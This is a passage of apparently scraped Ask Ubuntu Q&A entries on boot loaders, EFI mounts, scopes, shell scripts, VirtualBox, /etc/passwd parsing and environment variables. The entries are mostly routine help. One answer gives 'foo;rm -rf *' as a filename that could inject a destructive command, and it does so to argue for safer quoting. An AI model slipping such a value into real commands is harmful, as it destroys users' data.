you note enable you to launch two kernels, each with two sets of options (minimal and single-user). One of your kernels was not working, probably because you hadn't installed necessary proprietary video drivers for it. You could easily boot with the older kernel that did work. In Ubuntu, you could type sudo touch /boot/vmlinuz-4.2.0-16-generic.efi.signed (if that's the kernel that workd), which should make it the default option. In theory, installing a new kernel should install the necessary video drivers for it, but it sounds like that didn't work for you for some reason; or maybe the drivers for the new kernel were buggy. The question and answers you referenced (here) fixed the video driver issue for you. Installing GRUB was not necessary, and might or might not be preferable or create new problems.\nIf GRUB is currently your default boot manager and you want to go back to rEFInd, you can re-install rEFInd in whatever way you did before; or you can run the new refind-mkdefault script. This script is not yet part of rEFInd, but will be included in the next release. In the meantime, you can download it (click the \"download this file\" link) and type sudo python3 /path/to/refind-mkdefault to run it, changing /path/to to the appropriate path.\nIf you prefer rEFInd but want the purple Ubuntu splash screen, you can run the mkrlconf script that comes with rEFInd (run it in Ubuntu), then edit the /boot/refind_linux.conf file to add quiet splash to the boot options for your default boot (if those options aren't already present).\n", "Q: How to test a javascript scope on a real phone? I'm developing my first scope, hoping to enter the scopes showdown contest.\nI've decided to make a javascript scope. I'm having fun with the SDK and following along the javascript scopes tutorial at \nhttps://developer.ubuntu.com/en/scopes/tutorials/developing-scopes-javascript/\nI've also been reading other online documentation and API pages.\nI'm running Ubuntu 15.10, with the ubuntu-sdk-ppa-team ppa enabled. I've followed the guides on installing the SDK, created my click targets, installed the javascript scopes dev tools... did everything by the book. \nI've started developing my scope based on the default example for javascript scopes provided by the Ubuntu SDK.\nMy scope (which is a freesound scope, btw) is starting to work. It loads and runs just fine on the Desktop. Now I want to try it on my Aquaris phone, which has just been updated with the new OTA9.\nWhen I run my scope with the ubuntu phone as a target, I get the following:\n\n:-1: error: security:policy_groups_safe:freesound:debug: (REJECT) reserved policy group 'debug': not for production use\n\nIt seems the SDK adds some magic to my scope in order to run in DEBUG mode. However, the phone does not seem to like this. \nPoking around in the Run settings for my project, I've found an option called Enable debug helper in the UbuntuSDK click build deploy step. If I disable this option the previous error goes away. Presumably, the precious debug information will also go away (I could not verify this, because there is another error further along).\nAfter disabling the debug helper, I try to run my project again, in order to load it up into the phone. Now I get another error:\n\nUsing a custom scopelauncher is not yet supported\n\nAfter this nothing else happens.\nI noticed that the myscope/data/myscope.ini.in file it has the following line in the [ScopeConfig] section:\n\nScopeRunner=./node_modules/unity-js-scopes/bin/unity-js-scopes-launcher %S %R\n\nMaybe this is the custom scoperunner that the error is referring to? I've tried deleting this line and re-running the project. It seems to work, as the SDK is finally able to upload my scope to the phone. However, even if the scope loaded, it does nothing.\nNow I'm trying to run it again on the Desktop (without the scoperunner line that I've deleted from the scope ini file) and it also fails.

If I missed something, please let me know.\nSo here is my story:\nMy laptop was shipped with Win 8.1 (UEFI mode). I installed Ubuntu 14.04 later and told it to boot from its root partition. So I had two bootable partitions and usually just booted the Ubuntu one as I could also choose Windows in the grub menu. Some days ago I reinstalled Win 8.1 and as expected was not able to boot Ubuntu anymore. The Ubuntu partition was set unbootable. I then just installed grub2 on the boot partition created by Windows and did a sudo os-prober and a sudo update-grub. Now when booting from the Win boot partition grub shows up and I can choose between the operating systems and everything works fine. The only thing is that when I choose Ubuntu I now get the message\nDisk drive for /boot/efi is not ready or not present.\nContinue waiting or press s to skip or m for manual recovery.\n\nIf I press s Ubuntu boots normally and works fine, but the message is sort of annoying and I would also like to understand where it comes from.\nI guess I screwed up a bit when I decided to not boot from the Ubuntu partition anymore but from the Windows partition. I still have the /boot folder on my Ubuntu partition. Just re setting the boot flag on the Ubuntu partition would have probably made everything work as before, right?\nWhat is the best way to solve this problem?\nHere is a screenshot from gparted:\n\nEDIT:\nThe problem was simply that the serial number of /dev/sdb2 in /etc/fstab was wrong. Apparently it was changed by reinstalling Windows. After fixing that everything works fine. I accepted Rods answer because it helped me figure this out.\n\nA: First, EFI boot loaders are ordinary files that reside on the EFI System Partition (ESP), which is mounted at /boot/efi in Ubuntu. When an OS installs an EFI boot loader, it also creates an entry in NVRAM that points to its boot loader. You can usually get a boot menu showing these entries when you start the computer. This contrasts with BIOS, where boot loaders are stored in the first sector of the hard disk and (often) in the first few sectors of certain partitions, which are often marked with a \"boot flag.\" Thus, in BIOS, it makes sense to refer to a boot disk or a boot partition, but in EFI, these phrases are ambiguous or misleading; you've got boot files and NVRAM boot entries instead. Also, EFI does not use a \"boot flag.\" Confusingly, libparted (and hence parted and GParted) abuse the term \"boot flag\" to refer to the type code for the ESP; and setting this type code inappropriately can cause serious problems. I point all this out because your question is riddled with BIOS-centric terminology and, reading between the lines, it sounds as if you don't understand this critical difference between BIOS-mode and EFI-mode booting. Such misunderstandings often lead to people making serious mistakes, up to and including trashing their installations, so it's important that you learn a bit about this. For more on such differences, see Adam Williamson's blog post on how EFI-mode booting works.\nYour problem, though, is not directly related to any of this. Rather, you're unable to mount your ESP (/dev/sdb2 in your case) in Ubuntu. This symptom often results from the Windows \"Fast Startup\" feature. (Note that many EFIs have an unrelated feature with a similar name. It's the Windows feature that's relevant.) You can disable Fast Startup in Windows 8/8.1 as described here, or in Windows 10 as described here. (Lots of other pages also describe how to do this.) In some cases you may need to disable the Windows hibernate feature, too, as described here.\nOnce you've made these Windows changes, the ESP should become mountable in Ubuntu again. If it doesn't, you may need to back it up and re-create it. You may be able to force it to mount in Ubuntu by mounting it explicitly at the command line; or you can back it up in an EFI shell or in Windows. With that done, create a fresh filesystem on it and restore the backed-up files. You may then need to modify the /etc/fstab entry for /boot/efi to identify it with its new serial number (called a UUID in /etc/fstab, although it really isn't that). You can type sudo blkid /dev/sda2 to learn the serial number (\"UUID\") after you create a fresh filesystem on it.\n", "Q: Ubuntu 14.04 LTS not recognizing my wifi router I am new to Ubuntu,in Wifi-networks I am able to see the routers of my neighbors,and some of them in near vicinity but it don't recognizes my WIFI router,I tried connecting it by clicking Connect to hidden networks but couldn't connect,\nEverywhere I go be it my college or classes I am able to connect to the wifi facility avilable there but not in my home\nI am using wired connection now, Its awful,anybody please help me in fixing this problem    \n\n\nA: I don't know what wireless card you have in your computer.. or what router you have, but some of the latest BT routers (and probably others) are using new encryption protocols that some older wireless cards/software simply don't support. you may be able to change the encryption system in your router by logging in using a wired connection, and then opting for older wifi encryption .. sorry i cant remember ffhand the names of the encrption protocols.. offhand.. but this solution worked for a friend of mine.. after changing it suddenly his wifi appeared in the list, and he was happy\n", "Q: Ubuntu Ctrl+A for all select - Cinnamon I've installed cinnamon DE on Ubuntu 15.04 and now when I press Ctrl + A it cursor goes to the first letter of the line.

In case we use all host CPU cores we may want to consider an execution cap (e.g. 90%) to allow the host OS to operate smoothly while running a virtual machine.\nWe can also freely assign more or less RAM or VRAM in the machine's settings after installation.\nNearly all settings can be adapted later, including USB support, Networking, Audio cards, and more.\nHotplug CPUs\nWhen running Ubuntu as a guest it is even possible to hotplug a CPU while a virtual machine is running. Provided we had installed the guest additions we enable CPU hotplugging while the VM is not running with these commands:\nVBoxManage modifyvm \"VM name\" --cpuhotplug on\nVBoxManage modifyvm \"VM name\" --cpus 3  ## maximum number of CPUs\n\nAfter that we can assign (plug) or remove (unplug) a CPU of a running instance with one of the following commands:\nVBoxManage controlvm \"VM name\" plugcpu 1  ## number of CPU\nVBoxManage controlvm \"VM name\" unplugcpu 1\n\nNote that we can not unplug CPU 0 for obvious reasons.\n\nIt is not possible to change the amount of RAM assigned to the guest during runtime except we use memory ballooning, a technique to move already assigned RAM from one to another running virtual machine.\n", "Q: How to set Keyboard Shortcut for moving windows across Monitor in GNOME? I use GNOME 3 DE on ubuntu 14.04 . In unity, I set keyboard shorcut on ccsm so that I could move windows from monitor 1 to monitor 2 with keyboard shortcut. But when i switched to GNOME, ccsm doesnt work anymore. How do I suppose to do it in GNOME?\n\nA: The gnome keyboard settings show the shortcut to move a window to another monitor is Shift + Super + (Left, Right, Up or Down).  If this doesn't work for you check in Settings > Keyboard > Shortcuts(tab) > Navigation and see what the setting is for you.\nGnome versions < 3.18 (as far as I know) can get the same keyboard shortcuts using the Put Windows extension from extensions.gnome.org.  Settings for the extension can be changed using the gnome prefs tool (gnome-shell-extension-prefs)\n", "Q: Moving files with bash scripts I have a bash script that watches a folder, if something is added to the folder, the script will move all contents withing the monitored folder to the defined destination.\nTHE ISSUE:\n             - The script fails to move the files in the monitored folder to the destination folder through FileZilla (FTP). The script does work if you move the file to the monitored folder manually through a shell prompt. FTP is the only format not working properly. \nAny Ideas what the issue may be?\nHere is the script:\ninotifywait -m ~/folderA/fileA -e moved_to |\n    while read path action file; do\n        #echo \"The file '$file' appeared in directory '$path' via '$action'\"\n        # do something with the file\n    mv ~/folderA/fileA/* \"/folderB/myNewDest\"\n    done\n\n\nA: First, by having inotifywait -e moved_to only monitor for files moved to the target directory, you omit monitoring for files that were written or overwritten there, by, for example Filezilla. Add -e modify -e create to your command, or, unless you have a convincing reason to ignore some inotifywait events, discard all the -e whatever options.\nSecond, by not quoting the from files in your mv ~/folderA/fileA/* \"/folderB/myNewDest\" command you run the risk of being caught by silly filenames, e.g. foo;rm -rf *. I would suggest \nfind ~/folderA/fileA/ -maxdepth 0 -type f -print0 | \\\nxargs -0 mv --target-directory=/folderB/myNewDest --\n\nwhich does the same thing, but more safely. \n", "Q: How can I do a fresh reinstall of ubuntu I have a computer that is 100% ubuntu not a dual boot. most turials I find are for dual boot comps.

Choose the option to reinstall Ubuntu. Unetbootin makes it's own option for the boot option. The default can be used if you make a Live USB with a program like StartUp Disk Creator that is available in Ubuntu.\n\n\nOption to reinstall appears when Ubuntu us already installer.

One is the desktop version, my alternate (and almost) everyday computer, and a second server (headless) version.Eventually the server will be a file/media server for my home, but at the moment I am keen to use it to experiment, test out, and push the boundaries of both the server and the file system (I'd like to go with btrfs RAID5)\nI have been testing btrfs on the server setup over the last few days but have just realised I'm running a slightly older version (3.12) than the current version (4.0-4.4). It is the current repository version. Also the kernel is 3.19 vs 4.4.\nI would generally go for the \"if it ain't broke, don't fix it\" approach, however btrfs at this earlier version misses out on all the advancements made since then and towards 4.\nSince I am purely testing for the time being (but later heading to production on this box in the coming month or two) how should I approach trying later versions of both the kernel and file system?\nI do not have much experience with compiling and building modules myself, although I'm willing to learn, and I don't want to rely on the GUI since the server will be headless and worked on via SSH most of the time. I'm relatively comfortable on the command line.\nWhat approach have you taken when it comes to \"trying\" later versions?\n\n*\n\n*Could I utilise proposed builds via apt-get install,\n\n*Should I be downloading and building the kernel and btrfs myself, or\n\n*Should I upgrade(?) to 15.10 and work from there?\n\n\nA: In April this year, the next LTS version (16.04) will be issued.  You will be able to upgrade to it directly from 14.04 LTS. It will contain up to date versions of btrfs and the kernel.\nUpgrading to 15.10 (non-LTS) will require you to work through the intermediate upgrades (> 14.10 > 15.04 > 15.10).\nAre you able to wait 2-3 months?\n", "Q: Username change I'm changing my username on Ubuntu 14.04 as read on another question and I then get this message. \n\nPlease enter a username matching the regular expression configured\n  via the NAME_REGEX[_SYSTEM] configuration variable.

The simple rationale for this is that English is always available, so it would make little sense to set a non-English fallback language.\nTo enable Greek as the display language, you need to drag it to the far top of the list in this case.\n", "Q: dpkg: error processing package php5-mysql (--configure): When installing PHP and mySQL, I got the following error message.

Currently, when install Ubuntu Desktop, and by choosing automatic partition for a brand new hard drive, there is no way to select which file system will be used for it.\nIt auto-selects EXT4 and the installation proceeds!\nIs there anyway to tell the installation program to use something different, like XFS or BRTFS instead?\nI do not want to go through manual steps to use a different file system than EXT4! Because when in automatica mode, it creates boot partitions (EFI) automatically, or Grub partitions sometimes (non-EFI), it calculates the Swap automatically etc... So, I want \"guided partition\" but using something different than EXT4 for the root file system, but, how?\nCheers!\n\nA: Well, there is a bit of a weird way to do this.\nIf you want to automatically create the swap EFI boot partitions and bootloader, install with ext4.\nBoot back into the installer then you can do something more simple of deleting the ext4 partition create an xfs or btrfs partition format it click next and then the install will just go on. \nIt will reuse the existing swap partition don't worry about it saying that it will format the swap partition as that is parts of ram it just does not want to use currently.\nIf it is a fresh install then you do not have any data you will lose this way but do not do this on a partition you have things you want to keep as that data will be lost.\nThe gist here is use automatic to set all that stuff up then ubiquity will reuse what you already have with manual partitioning and you are just changing one partition and reinstalling twice. \n", "Q: Allowing a systemd system unit to access/mount a disk required for that service to run Preface: I am new to Ubuntu and Linux in general so bear with me.\nI have created a systemd system unit to run a program as a service. For added security, the service runs under its own group and user with no login capability. In order for the service to run, it requires access to several disks. To give the service access to the disks, I am using bindfs to remount the the disks mounted by my logged in user account with permissions allowing the service's user to access the mounted disks as well.\nThe service runs successfully; however, I can see issues with this approach because if I reboot, and the service starts before I have logged in, it will fail I presume because I have not logged in yet, my user account will not have mounted the disks, bindfs will have nothing to remount, and the service will not have access to the disks. \nSo what is the best way to run the service and give its user access to these disks? Is there a way for the unit to mount the disks in a way that they will be accessible to the service and my user account? Is the only solution to run the daemon under my user account? Or am I am approaching this from an entirely wrong angle?\nAny help will be greatly appreciated.\n\nA: So after a little more research, I was able to solve my issue by creating a new group, and adding my user account and service account to it. Then, in fstab, I mounted the disks using my user account and the new group as the owner, and set it to auto-mount on startup. Now, upon boot, the disks are mounted and the services have access to them.\nDetailed instructions on how to accomplish the above can be found in this answer.\n", "Q: copy local file to remote server in ubuntu terminal Jeez, where's Windows drag and drop when you need it.

I need a list with only those apps that are currently open/running in Dash, the ones that have that small white arrow(s) on the left side of the icon.\nIs there any way to get it?\n\n\nA: Interesting question.\nAs always, there are different ways to get a list of these applications, each of them with specific ad- and disadvantages. \nGetting a list of processes, represented in the Launcher, using the window list\nSince only applications with a (mapped) window appear in the Launcher, using:\nwmctrl -lp \n\n(wmctrl is not installed by default), we can get a list of opened windows and the process- id the windows belong to. The format of the output is:\n0x05204641  0 12618  jacob-System-Product-Name verhaal (~) - gedit\n\nwhere for us most important information is in:\n\n\n*\n\n*the first string (0x05204641); this is the window -id\n\n*the third string (12618); this is the process id (pid) the window belongs to, and,\n\n*the last section (verhaal (~) - gedit); this is the window name.\n\n\nOnce we have the pid, we can look up the corresponding process name by the command:\nps -p <pid> -o comm=\n\nWe can script the steps above, and list the output(s) for existing windows, looking like (using python):\n{'gnome-terminal', 'nautilus', 'gedit', 'GuitarPro.exe', 'firefox', 'thunderbird', 'soffice.bin'}\n\nComplications\nThis seems straightforward. However, as always, reality is a bit more complicated. There are a few exceptions and complications we need to take care of:\n\n\n*\n\n*Some windows will belong to pid 0, which will raise an error when trying to get their properties. Windows of Idle (python IDE) or tkinter are such windows.\n\n*Some windows are no \"real\" or windows, like transient windows (windows, which are called from, and belonging to other windows) or for example the desktop itself. These windows are listed as windows in the output of wmctrl, but do not appear separately in Dash.\n\n*In some cases, the application's name is quite different from the process name, for example in the case of LibreOffice where all modules have the process name of soffice.bin. At the same time, running the command soffice.bin will not work. In case you need to identify the modules (Calc, Writer etc.) separately, you'd need to get additional information, from the window's name for example.\n\n*Another example is the process name of gnome-terminal, as it appears in the process list, as in the output of ps -e ww. In 14.04, gnome-terminal appears as gnome-terminal, however, in 15.04 / 15.10 it shows: /usr/lib/gnome-terminal/gnome-terminal-server. \n\n\nWhat we need to fix at least\nTo fix the most important issues above, you need to:\n\n\n*\n\n*add a check if the window is a \"real\" or \"normal\" window, checking with\nxprop -id <window_id>\n\nIf the output includes the line:\n_NET_WM_WINDOW_TYPE(ATOM) = _NET_WM_WINDOW_TYPE_NORMAL\n\nThe window is a valid window in the sense of the Unity Launcher\n\n*To fix the process name of gnome-terminal in 15.x (assuming you want the presented process name to be gnome-terminal) we need to add an exception, to rename the process name into gnome-terminal if it appears as \n/usr/lib/gnome-terminal/gnome-terminal-server\nScript\n#!/usr/bin/env python3\nimport subprocess\nimport sys\n\ntry:\n    listed = sys.argv[1]\nexcept IndexError:\n    listed = []\n\nget = lambda cmd: subprocess.check_output(cmd).decode(\"utf-8\").strip()\n\ndef check_wtype(w_id):\n    # check the type of window; only list \"NORMAL\" windows\n    return \"_NET_WM_WINDOW_TYPE_NORMAL\" in get([\"xprop\", \"-id\", w_id])\n\ndef get_process(w_id):\n    # get the name of the process, owning the window\n    proc = get([\"ps\", \"-p\", w_id, \"-o\", \"comm=\"])\n    proc = \"gnome-terminal\" if \"gnome-terminal\" in proc else proc\n    return proc\n\nwlist = [l.split() for l in subprocess.check_output([\"wmctrl\", \"-lp\"])\\\n         .decode(\"utf-8\").splitlines()]\n\nvalidprocs = set([get_process(w[2]) for w in wlist if check_wtype(w[0]) == True])\n\nif listed == \"-list\":\n    for p in validprocs:\n        print(p)\nelse:\n    print(validprocs)\n\nHow to use\n\n\n*\n\n*The script needs wmctrl:\nsudo apt-get install wmctrl\n\n\n*copy the script above into an empty file, save it as get_running.py\n\n*run it by the command:\npython3 /path/to/get_running.py\n\nIt will output like:\n{'gnome-terminal', 'nautilus', 'gedit', 'GuitarPro.exe', 'firefox', 'thunderbird', 'soffice.bin'}\n\nor, run with the argument -list:\nthunderbird\nnautilus\ngnome-terminal\nfirefox\ngedit\nGuitarPro.exe\nsoffice.bin\n\nNotes\nFrom your question, it is not completely clear what is exactly the purpose of the found list. If you need to have the application's name, as it appears in the interface (\"readable\" names), a completely different approach might be suited:\n\n\n*\n\n*All globally installed applications do have a .desktop file in /usr/share/applications. In far most cases, we can conclude the process name and the interface name of the application from its .desktop file. Using this information, we could relatively easy create a list of running GUI applications, presented by their \"readable\" name. \n\n\nAlso in this case however, reality is also more complicated then theory, as explained here.\n\nA: The way to do it with qdbus and org.ayatana.bamf interface.\nList of open applications by .desktop file:\n$ qdbus org.ayatana.bamf /org/ayatana/bamf/matcher \\                           \n> org.ayatana.bamf.matcher.RunningApplicationsDesktopFiles\n/usr/share/applications/compiz.desktop\n/usr/share/applications/firefox.desktop\n/usr/share/applications/x-terminal-emulator.desktop\n\nUsing org.ayatana.bamf.matcher.RunningApplications and  org.ayatana.bamf.view.Name methods\n$ qdbus org.ayatana.bamf /org/ayatana/bamf/matcher  \\                          \n> org.ayatana.bamf.matcher.RunningApplications | \\                             \n> xargs -I {} qdbus org.ayatana.bamf {} org.ayatana.bamf.view.Name\nFirefox Web Browser\nMY CUSTOM TERMINAL\nCompiz\n\n", "Q: What does this \"printf\" command do? I was going through a tutorial and there I came across a command:\nprintf \"%(%s)T\"\n\nThe output of this command is:\n1454299615\n\nCould anybody please tell me what is this command and what the output means?\n\nA: It's a way to express the formatted time by printf.\nThe format is:\n%(FORMAT)T\n\nWhere FORMAT is defined by strftime(3).\nSo to get the epoch time (Time in seconds since 1970-01-01 00:00:00 UTC), we need strftime(3) format %s:\nprintf \"%(%s)T\\n\"\n\nNote that you also need \\n at the end to add a newline as printf (unlike echo) does not add it by default.\nExample:\n$ printf \"%(%s)T\\n\"\n1454300377\n\n$ printf \"%(%Y-%m-%d)T\\n\"\n2016-02-01\n\n$ printf \"%(%Y-%m-%d %H:%M:%S)T\\n\"\n2016-02-01 10:20:27\n\n\nJust for the sake of completeness, you can also use date command in a similar strftime(3) formatted manner to get the time:\n$ date '+%s'\n1454300542\n\n$ date '+%Y-%m-%d'    ## Short form: date -I\n2016-02-01\n\n$ date '+%Y-%m-%d %H:%M:%S'\n2016-02-01 10:22:47\n\nNOTE: This behavior is specific to bash's and ksh's  built-in function printf, and doesn't work with /usr/bin/printf , csh, and zsh built-ins. \n", "Q: parsing `/etc/passwd` to find root user, and whether user can run interactive shell I want to parse /etc/passwd file to find out if the user has root privilege and can run interactive shell.  \naccording to \n\nUID 100-999 are reserved by system for administrative and system accounts/groups\n\nwhat I understood is if the UID is between 100 and 999,the user has root privilege. Am I right?\nnext is \nHow do you say user can run interactive shell by reading /etc/passwd?\nPS. I am parsing this files in python, I can implement the logic, I just don't know the how to find out root user and what is Interactive shell and how to find one.\n\nA: There is two types of accounts, system and regular user. System accounts belong to services and daemons, such as lightdm, dnsmasq, etc.Typically you cannot login into those accounts (although there are ways).\nRegular users, such as your account or other people  accounts, can login and interact with the OS through shell (could be bash, ksh, mksh, csh, or graphical shell such as Gnome or Unity).\nSystem accounts range from 100 to 999 by default. There exists one special case, nobody , who has ID of 65534 (That's the max UID number ). On my system for instance dnsmasq it runs dnsmasq service.\nRegular user accounts have UID range from 1000 to 65533. Those users can login, unless their password is disabled or their entry in /etc/passwd has shell set to /usr/sbin/nologin, or prevented in some other way. These users can have root privilege if they belong to sudo group.\nSo if you want to find users who have sudo privilege you need to parse /etc/group file. Here's mine:\n$ awk '/sudo/' /etc/group                                      \nsudo:x:27:xieerqi,testuser\n\nTo get just the users, use : as separator and print 4th field.\n$ awk -F':' '/sudo/{print $4}' /etc/group                      \nxieerqi,testuser\n\nIn python this is done as so:\n>>> with open(\"/etc/group\") as file:\n...    for lines in file:\n...       if lines.__contains__(\"sudo\"):\n...          print lines.split(\":\")[3]\n\nHere's even more interesting approach. How about if we want to take all the sudo users and see if they have a shell set up in /etc/passwd ?\n$ awk -F':' '/sudo/{gsub(/\\,/,\"\\n\");print $4 }' /etc/group | xargs -I {} grep '^{}\\:.*' /etc/passwd               \nxieerqi:x:1000:1000:xieerqi,,,:/home/xieerqi:/bin/mksh\ntestuser:x:1001:1001:,,,:/home/testuser:/bin/bash\n\n\nA: In python this would be done like\nimport grp\nimport pwd\nprint([x for x in grp.getgrnam('sudo').gr_mem if pwd.getpwnam(x).pw_shell not in ('/bin/false', '/bin/nologin')])\n\nWhere grp.getgrnam('sudo').gr_mem would return all group members of group sudo and pwd.getpwnam(USER).pw_shell returns the users shell from /etc/passwd.\n\nBut only group membership in sudo is not the only way to become root. Your users could also have individual entries in /etc/sudoers which would give them root permissions. So you'd need to parse /etc/sudoers as well.\n", "Q: glibc-2 is required for this package I'm pretty new to the Linux world and I'm trying to compile a plugin for DeaDBeeF that's located in this git repo.

But How do you say that, defined shell is interactive?  \nI am parsing this files in python, I can implement the logic, I just don't know the how to find out how to identify Interactive shell.\nPS. I want to find it out using python.\n\nA: I think you have a basic misconception: talking of a shell that you cannot run interactively but that you can run non-interactively is much like talking of a car that you can't drive but that you can use to listen to the radio.\nThe main purpose of a shell is running interactively, the fact that it can run non-interactively is the optional, not the other way around.\nCloser to the concept of a shell that you cannot run interactively but that you can run non-interactively is an interpreted language which can't be interpreted interactively (though one real example is not occuring to me right now: the most common interpreted languages all can run interactive sessions: Perl, Python, PHP, ...)\nThat been said if you want to find out whether a user is allowed to login through a shell, you can use this command:\nshell=$(getent passwd user | cut -d ':' -f 7); [ \"$shell\" = \"/usr/sbin/nologin\" -o \"$shell\" = \"/bin/false\" ] && printf 'User is not allowed to login\\n' || printf '%s\\n' \"$shell\"\n\n(replace user in the getent passwd user command with the user's username)\nIn Python you could do:\n#!/usr/bin/python\nuser = \"user\"\nwith open(\"/etc/passwd\") as file:\n    for line in file:\n        if line.split(\":\")[0] == user:\n            if line.rstrip(\"\\n\").split(\":\")[6] in [\"/usr/sbin/nologin\", \"/bin/false\"]:\n                print(\"User is not allowed to login\")\n            else:\n                print(line.rstrip(\"\\n\").split(\":\")[6])\n\n(replace user in the user = \"user\" statement with the user's username)\nOr, as suggested by muru, better using the pwd module:\n#!/usr/bin/python\nfrom pwd import getpwnam\n\nuser = \"user\"\nshell = getpwnam(user)[6]\nif shell in [\"/usr/sbin/nologin\", \"/bin/false\"]:\n    print(\"User is not allowed to login\")\nelse:\n    print(shell)\n\n(replace user in the user = \"user\" statement with the user's username)\nIn all of the examples above if the seventh field of the user's /etc/passwd entry is either /usr/sbin/nologin or /usr/bin/false a message saying that the user is not allowed to login is printed; otherwise the user's login shell is printed.\nBut keep in mind that not being able to login through a shell doesn't mean the user is not allowed to login at all, and that there might be bogus shells other than /usr/sbin/nologin or /bin/false used to forbid the user's login. You should watch out for those too.\n\nA: Loop through file splitting each line into fields and check if 6th field doesn't contain \"no-login\" for all the lines where UID is greater than 1000\n>>> with open(\"/etc/passwd\") as file:\n...     for line in file:\n...        if  int(line.split(\":\")[2])  > 1000  and not str(line.split(\":\")[6]).__contains__(\"nologin\"):\n...            print line\n... \ntestuser:x:1001:1001:,,,:/home/testuser:/bin/bash\n\ntester:x:1002:1002:TESTER,,,:/home/tester:/bin/bash\n\nnewUser:x:1003:1003::/home/newUser:\n\ntestUser:x:1004:1004::/home/testUser:\n\ntestuser2:x:1005:1005:asdf,asdf,asdf,asdf,asdf:/home/testuser2:/bin/bash\n\nUsernames who have shell set can login with that shell, for instance xieerqi has /bin/mksh, while testUser has /bin/bash. Other users don't have shell set, which will default to /bin/bash\n", "Q: Can you download Android applications with Ubuntu?

Meaning I can't change them using the System settings. I checked environment variables. QT_OVERRIDE_STYLE (or whatever it's called) is not set. However systemsettings5 saves its changes to ~/.config/Trolltech.conf, but it looks like the changes aren't respected.\nI have even tried to use the PPA with the \"staging\" version of Plasma. Unfortunately that doesn't work either.

Exporting    kde    instead fixes the problem if you try to start programs via Terminal. \nHowever even adding this to .xinitrc or something else, this will just get overridden (probably by the plugin).

Then you can resize /dev/sda9.\nEDIT: CARE! This will take time, and you can't abort it. For such a small space however it should be ok.\nEDIT2: In case it's not obvious enough, you shift it by grabbing the box and pulling it to the right.\n\nA: First, before you do anything else, there is always a small chance you will loose data, so back up your data.\nThe free (unallocated) space must be right next to (adjacent / touching) the partition you wish to expand.\nYou have a lot of partitions in a somewhat chaotic sequence, thus the free space is not adjacent to the partition you wish to enlarge.\nSo you must move the partitions and free space. This must be done in steps.\nIt appears you wish to expand sda9 ? and there is a small NFTS partitoin between sda9 and the free space so ...\n\n\n*\n\n*Delete or move the NTFS partition (? sda5 )-> apply changes \n\n\nnow the free space and sda9 are next to each other so\n\n\n*Enlarge sda7 -> apply changes.\n\n\nI would suggest you simplify your partitioning scheme and re-order your partitions, but that will take time and there is always some risk of data loss.\n", "Q: Ubuntu 12.04 ODBC connection to MySQL I have task - write CEL events into mysql.

And terminal said it could not find libxml2. So I had the bright idea of sudo apt get remove libxml2 so as to get the most recent version.  \nAs the program was running programs disappeared from my screen.  This is bad. So I pressed control c. What have I done? How do I fix?\nIn recovery mode it says libxmllibxml2 is installed but that i can remove unneeded packages with autoremove.\nCan that be right that all packages are unneeded. I have no gui\n\nI think i deleted ubuntu desktop somehow. It no longer can be found. Aptget tries to install from Internet but am not connected. No cd drive on this device.\nI have linux on usb stick but i can't find desktop on there\n\nA: The command you entered removed the package containing part of the XML processor for the entire operating system.  To do so, it must have also removed many, many other packages that depend on libxml2 -- which apparently includes some critical component of your operating system.  The large number of \"unneeded\" packages are other depends for those extra packages that were removed -- depends that are no longer needed by anything still installed.\nMerely reinstalling libxml2 won't fix the problem; you'd still need to reinstall all the other packages that were removed, a task that's most likely impractical (if you don't have a complete list, even if you have unlimited time, you won't get there -- and your internet might not work without libxml2 anyway).  Most likely the only solution is going to be to use a Live media (CD, USB drive, etc.) to make a backup of your data files, followed by a reinstall of the entire operating system.\n", "Q: How can I open a Microsoft Word document securely? I got an email in my spamfilter with an attached Microsoft Word document. How can I view that file securely on Ubuntu. The 'from' email header shows that it is from a copy machine, but it could very well be spoofed. I cannot see the full header in the spamfilter email/webservice, so the file may be genuine or trojan.\nI have downloaded the file and used file and strings, which I suppose are usually ok (Update: Not even strings may be ok. There has been vulnerabilities associated with the program, see http://www.ubuntu.com/usn/usn-2496-1/).

I'm curious about learning about choosing correct env. variables. How to make out setting what env. variable would get the job done\nExample:\nif you want to make sure that command history always written immediately, you can put that command into your PROMPT_COMMAND variable (curiosity rose from this solution):\nexport PROMPT_COMMAND='history -a'\n\nThis is my dilemma: how was PROMPT_COMMAND chosen to get the job done.\nHow do I acquire this talent? \n\nA: If you're using bash as your default shell, you can indeed set PROMPT_COMMAND.\nYou usually find hints or detailed guidelines in the manual pages of a command (online from the bash man page) or by typing man bash for example:\nPROMPT_COMMAND\nIf set, the value is executed as a command prior to issuing each primary prompt.\n\nI did propose another solution using this env var a while ago: Adding a suffix at the end of each shell command.\nAsk Ubuntu is a gold mine for who wants to learn and discover more about Linux.\n\nA: Read the man page of the program you are trying to influence with an environment variable. For PROMPT_COMMAND it's man bash. Since programs generally use all upper case environment variables, and environment variables are passed to programs as strings, (in the env array, along with the argv array) and accessed by name, you can generate a list including all the environment variables looked at by a program via (change bash to the program you're interested in):  \nstrings $(type -p bash) | egrep '^[A-Z0-9]+$'\n\nOr replace the $(type -p bash) with the actual path to the binary.\nUser setting of environment variables is usually done in ~/.bashrc, or in a file called by ~/.bashrc, like this:  \nexport LESS=\"-XMersj3\"\n\nThis sets my default options for less (See man less).\nAfter a change to ~/.bashrc, you must source the file (via . ~/.bashrc) to populate your environment with the updated definitions. Logging out/in also re-sources ~/.bashrc, BUT if you've broken ~/.bashrc, you may have trouble logging in. \n\nA: \nhow was PROMPT_COMMAND chosen to get the job done\n\nPROMPT_COMMAND is one of the variables specific to bash, which runs its value as a command before printing your $PS1 prompt on screen. By default it's unset.\n\nHow to make out setting what env. variable would get the job done\n\nBy reading the man page of bash, man bash in terminal. There is list of environment variables there. There is no talent, only practice. And RTFM'ing, a lot.\n", "Q: Is my system able to run 64-bit OS? I am using 32-bit Ubuntu 14.4 LTS.  How can I tell if my computer can run a 64-bit os?

